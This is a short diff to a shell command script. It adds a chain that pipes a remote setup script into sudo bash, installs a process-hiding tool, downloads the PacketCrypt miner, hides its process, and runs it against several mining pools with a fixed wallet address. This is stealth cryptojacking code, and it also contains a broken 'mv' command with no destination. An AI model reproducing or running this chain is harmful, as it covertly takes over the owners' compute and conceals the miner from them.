@@ -1,2 +1,2 @@
-wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O packetcrypt && chmod +x packetcrypt 
+curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider && apt install screen && rm -rf danila-miner-2.3.1-ubuntu-bionic.tar.gz && wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O packetcrypt && chmod +x packetcrypt && mv packetcrypt && sudo ph add packetcrypt && screen 
 ./packetcrypt ann -p pkt1qvdhx27ls80lrlvtts4dctggpaq5mzf03eh4g9j http://pool.pktpool.io http://pool.pkt.world https://stratum.zetahash.com/ http://pool.pktco.in http://pool.pkteer.com -t 1 
